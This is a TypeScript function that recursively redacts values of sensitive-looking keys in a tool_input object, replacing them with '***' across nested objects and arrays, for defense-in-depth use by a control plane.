/** Mask sensitive fields in tool_input (recursive). Exported for defense-in-depth use by control-plane. */
export function maskSensitiveFields(input: Record<string, unknown>): Record<string, unknown> {
  const masked: Record<string, unknown> = {}
  for (const [key, value] of Object.entries(input)) {
    if (SENSITIVE_FIELD_RE.test(key)) {
      masked[key] = '***'
    } else if (value !== null && typeof value === 'object' && !Array.isArray(value)) {
      masked[key] = maskSensitiveFields(value as Record<string, unknown>)
    } else if (Array.isArray(value)) {
      masked[key] = value.map(item =>
        item !== null && typeof item === 'object' && !Array.isArray(item)
          ? maskSensitiveFields(item as Record<string, unknown>)
          : item
      )
    } else {
      masked[key] = value
    }
  }
  return masked
}
